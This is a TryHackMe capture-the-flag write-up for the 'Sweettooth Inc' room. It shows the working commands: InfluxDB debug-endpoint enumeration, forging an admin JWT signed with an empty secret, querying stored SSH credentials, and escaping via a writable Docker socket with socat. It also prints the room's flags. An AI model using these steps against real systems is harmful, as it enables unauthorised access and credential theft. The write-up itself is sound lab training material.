# Sweettooth Inc Writeup - TryHackMe 🚩
This writeup documents the exploitation process for the **Sweettooth Inc.** machine on TryHackMe, covering InfluxDB exploitation via JWT hijacking and Docker Socket Escape to gain root access on the host.

## Room details
Difficulty: Medium

Type: InfluxDB, JWT Exploitation, Docker Escape

Link: https://tryhackme.com/room/sweettoothinc

## 1. Reconnaissance
The process began with an nmap scan to identify services running on target 10.81.143.182.

```bash
nmap 10.81.143.182
```

Scan Results:

Port 111 (rpcbind): Open

Port 2222 (SSH): Open

Port 8086 (InfluxDB): Open

![Nmap Results](<./assets/Screenshot 1.png>)
<br>
*Figure 1: (Nmap Port Scanning Results).*


```bash 
nmap -sV --script vuln -T4 -Pn -v 10.81.143.182
```
Result: Db Software Name: InfluxDB

![DB software name](<./assets/Screenshot 2.png>)
<br>
*Figure 2: (Identification of InfluxDB v1.3.0 running on port 8086).*

---
2. Information Disclosure & JWT Exploitation
The InfluxDB service (v1.3.0) on port 8086 was found to be vulnerable to information disclosure via the /debug/vars and /debug/requests endpoints.

Enumeration Steps:

```bash
curl -s http://10.81.143.182:8086/debug/vars | grep -oP '\"database\":\"\K[^\^]+' | sort -u
```
Result: Identified the database names: creds, docker, mixer, tanks.

![DB name](<./assets/Screenshot 3.png>)
<br>
*Figure 3: (Identified the database names: creds, docker, mixer, tanks).*

---


```bash
curl -i http://10.81.143.182:8086/debug/requests
```

Found the database username: o5yY6yya.

![Found username](<./assets/Screenshot 4.png>)
<br>
*Figure 4: (Identified the usernames: o5yY6yya.)*

---


Discovered that the InfluxDB instance used an empty secret for JWT signing.

I generated a malicious JWT admin token using Python:
```bash
python3 -c 'import jwt; print(jwt.encode({"username": "o5yY6yya", "exp": 2000000000}, "", algorithm="HS256"))'
```
![Generate token](<./assets/Screenshot 5.png>)
<br>
*Figure 5: (Generate JWT admin token.)*

---

3. Initial Access (User: uzJk6Ry98d8C)
Using the forged JWT token, I queried the creds database and specifically the ssh measurement to retrieve the SSH credentials.
##GAMBAR 9
```bash
curl -s -G "http://10.81.143.182:8086/query?db=creds" \
--data-urlencode "q=SELECT * FROM ssh" \
-H "Authorization: Bearer <FORGED_TOKEN>"
```
I successfully logged in via SSH on port 2222.

User Flag: THM{V4w4FhBmtp4RFDti}

4. Privilege Escalation (Container Root)
Inside the container, I discovered that the Docker socket (/var/run/docker.sock) was writable. Since many standard binaries like curl were missing, I used socat to interact directly with the Docker API.

I used the Docker API archive endpoint to read the internal root flag:

Bash
echo -e "GET /containers/GGWP/archive?path=/root/root.txt HTTP/1.1\r\nHost: localhost\r\n\r\n" | /usr/bin/socat - UNIX-CONNECT:/var/run/docker.sock
5. Docker Escape (Host Root)
To escape the container and gain root access to the host, I created a new container and mounted the host's root directory (/) to /mnt inside the container.

Exploitation Steps:

Created a container named GGWP with a bind mount.

Started the container.

Used the archive endpoint to read the flag from the host's /root directory via the /mnt mount point.

Bash
echo -e "GET /containers/GGWP/archive?path=/mnt/root/root.txt HTTP/1.1\r\nHost: localhost\r\n\r\n" | /usr/bin/socat - UNIX-CONNECT:/var/run/docker.sock
Final Results:

Root Flag: THM{nY2ZahyFABAmjrnx}

Final
All tasks completed successfully.
